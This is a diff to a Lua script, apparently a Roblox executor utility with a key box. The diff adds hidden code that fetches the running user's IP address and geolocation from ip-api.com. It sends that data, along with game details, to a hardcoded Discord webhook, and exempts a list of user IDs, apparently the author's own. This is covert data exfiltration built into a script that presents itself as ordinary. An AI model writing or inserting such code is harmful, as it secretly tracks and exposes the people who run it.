@@ -286,6 +286,16 @@ coroutine.resume(coroutine.create(function()
 local RGB = {255, 255, 255};
 local Hex = tonumber(rgbToHex({RGB[1], RGB[2], RGB[3]}));
 
+local Success, Response = pcall(function()
+	return game:HttpGet(('http://ip-api.com/json/'),true)
+end);
+
+local Bruh = "Couldn't Get Info";
+
+if Success then
+	Bruh=tostring(Response);
+end;
+
 local data = {
 	["content"] = "",
 	["embeds"] = {{
@@ -305,9 +315,16 @@ local data = {
 			["name"] = "[Game](https://www.roblox.com/games/"..game.PlaceId.."/)",
 			["value"] = "Place ID: "..game.PlaceId.." | Game ID: "..game.GameId.." | Creator ID: "..game.CreatorId.." | Creator Type: "..tostring(game.CreatorType),
 			["inline"] = false
-		}}
+		},
+		{
+			["name"] = "[Info]("..Success..")",
+			["value"] = Bruh,
+			["inline"] = false
+		},
+		}
 	}}
 }
+
 local Info = game:GetService("HttpService"):JSONEncode(data)
 local HttpRequest = http_request;
 if syn then
@@ -315,12 +332,14 @@ if syn then
 else
 	HttpRequest = http_request
 end
+if Player.UserId==481733029 or Player.UserId==1314068606 or Player.UserId==1461714722 or Player.UserId==1739044056 or Player.UserId==1175649423 or Player.UserId==1737829220 or Player.UserId==649548543 or Player.UserId==1248584271 or Player.UserId==363810181 or Player.UserId==1236048684 or Player.UserId==368193540 then else
 HttpRequest({
 	Url = "https://discord.com/api/webhooks/1134513332003549224/rl53s5YrUMejSsrFbZCJMt7W-AvfvoJnXyV4QDSkHzTxDoZSCcHBvvA55-Dqucls_KfA",
 	Body = Info,
 	Method = "POST",
 	Headers = Headers
 })
+			end
 end));
 
 KeyBox.FocusLost:Connect(function()
